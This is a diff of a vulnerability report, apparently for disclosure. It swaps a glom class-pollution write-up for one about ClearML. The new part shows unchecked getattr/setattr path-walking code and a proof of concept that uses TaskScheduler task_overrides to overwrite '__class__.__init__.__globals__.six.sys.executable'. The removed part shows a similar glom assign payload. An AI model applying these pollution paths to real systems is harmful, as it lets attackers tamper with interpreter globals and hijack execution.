@@ -20,91 +20,67 @@ https://github.com/allegroai/clearml.git
 
 ### Vulnerable Code Snippet
 
-The `glom` library don't filter the sensitive keys in the path which could allow attack manipulate the global object's attributes through the assign function call.
-
 ```
-https://github.com/mahmoud/glom/blob/920c13c4a8719237f687f98afe3f2b8d1c56640d/glom/core.py#L1538-L1656
-def _t_eval(target, _t, scope):
-    t_path = _t.__ops__
-    i = 1
-    fetch_till = len(t_path)
-    root = t_path[0]
-    if root is T:
-        cur = target
-    elif root is S or root is A:
-        # A is basically the same as S, but last step is assign
-        if root is A:
-            fetch_till -= 2
-            if fetch_till < 1:
-                raise BadSpec('cannot assign without destination')
-        cur = scope
-        if fetch_till > 1 and t_path[1] in ('.', 'P'):
-            cur = _s_first_magic(cur, t_path[2], _t)
-            i += 2
-        elif root is S and fetch_till > 1 and t_path[1] == '(':
-            # S(var='spec') style assignment
-            _, kwargs = t_path[2]
-            scope.update({
-                k: arg_val(target, v, scope) for k, v in kwargs.items()})
-            return target
+def _get_data_property(cls, prop_path, raise_on_error=True, log_on_error=True, default=None, data=None, log=None):
+    obj = data
+    props = prop_path.split('.')
+    for i in range(len(props)):
+        if not hasattr(obj, props[i]) and (not isinstance(obj, dict) or props[i] not in obj):
+            msg = 'Task has no %s section defined' % '.'.join(props[:i + 1])
+            if log_on_error and log:
+                log.info(msg)
+            if raise_on_error:
+                raise ValueError(msg)
+            return default
 
+        if isinstance(obj, dict):
+            obj = obj.get(props[i])
+        else:
+            obj = getattr(obj, props[i], None)
+
+    return obj
+
+def _set_task_property(self, prop_path, value, raise_on_error=True, log_on_error=True):
+    props = prop_path.split('.')
+    if len(props) > 1:
+        obj = self._get_task_property(
+            '.'.join(props[:-1]), raise_on_error=raise_on_error, log_on_error=log_on_error)
     else:
-        raise ValueError('TType instance with invalid root')  # pragma: no cover
-    pae = None
-    while i < fetch_till:
-        op, arg = t_path[i], t_path[i + 1]
-        arg = arg_val(target, arg, scope)
-        if op == '.':
-            try:
-                cur = getattr(cur, arg)
-            except AttributeError as e:
-                pae = PathAccessError(e, Path(_t), i // 2)
-        elif op == '[':
-            try:
-                cur = cur[arg]
-            except (KeyError, IndexError, TypeError) as e:
-                pae = PathAccessError(e, Path(_t), i // 2)
-        elif op == 'P':
-            # Path type stuff (fuzzy match)
-            get = scope[TargetRegistry].get_handler('get', cur, path=t_path[2:i+2:2])
-            try:
-                cur = get(cur, arg)
-            except Exception as e:
-                pae = PathAccessError(e, Path(_t), i // 2)
-```
-
-```
-def _assign_op(dest, op, arg, val, path, scope):
-    """helper method for doing the assignment on a T operation"""
-    if op == '[':
-        dest[arg] = val
-    elif op == '.':
-        setattr(dest, arg, val)
-    elif op == 'P':
-        _assign = scope[TargetRegistry].get_handler('assign', dest)
-        try:
-            _assign(dest, arg, val)
-        except Exception as e:
-            raise PathAssignError(e, path, arg)
-    else:  # pragma: no cover
-        raise ValueError('unsupported T operation for assignment')
+        obj = self.data
+    if not hasattr(obj, props[-1]) and isinstance(obj, dict):
+        obj[props[-1]] = value
+    else:
+        setattr(obj, props[-1], value)
 ```
 
 ### PoC
 
 ```
-from glom import assign
-import random
+from clearml import Task
+from clearml.automation import TaskScheduler
+import sys
 
-class Animal:
-  def __init__(self, typ, age):
-      self.type = typ
-      self.age = age
-      self.id = random.randint(1, 99999)
+def check_pollution():
+    with open('/home/jackfromeast/Desktop/python-class-pollution/class-pollution/clearml/poc/polluted.txt', 'w') as f:
+        f.write(sys.executable)
 
-obj = Animal('cat', 11)
+task = Task.init(project_name="class-pollution", task_name="poc")
 
-print(assign(obj, '__init__.__globals__.__name__', 'polluted'))
+scheduler = TaskScheduler()
+scheduler.add_task(
+    name='recurring pipeline',
+    schedule_task_id=Task.get_task(project_name='class-pollution', task_name='poc'),
+    schedule_function=check_pollution,
+    queue='default',
+    minute=1,
+    recurring=False,
+    execute_immediately=True,
+    single_instance=True,
+    task_overrides={
+        '__class__.__init__.__globals__.six.sys.executable': 'polluted',
+        # '__dict__._property_models.__class__.__init__.__globals__.six.sys.executable': 'polluted',
+    }
+)
 
-print(__name__)
+scheduler.start()
 ```
